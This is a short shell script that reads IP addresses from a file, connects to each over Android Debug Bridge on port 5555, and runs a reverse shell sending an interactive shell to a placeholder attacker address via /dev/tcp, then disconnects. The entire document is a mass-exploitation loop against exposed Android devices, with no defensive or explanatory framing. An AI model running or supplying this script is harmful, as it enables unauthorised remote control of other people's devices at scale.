cat ip.txt | while read line
do
   adb connect $line:5555;
   sleep 0.2;
   adb shell sh -i >& /dev/tcp/IP/PORT 0>&1;
   sleep 0.2;
   adb disconnect;
done
